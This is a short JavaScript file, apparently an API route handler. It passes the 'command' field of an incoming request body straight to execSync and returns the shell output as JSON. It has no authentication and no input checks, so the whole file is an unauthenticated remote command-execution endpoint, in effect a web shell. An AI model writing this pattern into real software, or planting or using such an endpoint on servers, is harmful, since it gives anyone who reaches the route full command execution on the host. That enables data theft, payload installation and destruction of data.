import { execSync } from 'child_process'

async function run(com) {
    let ret = [];
    try {
        const comRet = execSync(com).toString();
        ret.push(comRet)
    } catch (error) {
        ret.push(error.message)
    }
    return ret;
}

export default async (req, res) => {
    const ret = await run(req.body.command);
    const text = ret.join("\n")
    const result = text.split('\n').filter(e => e);
    return res.json(result);
}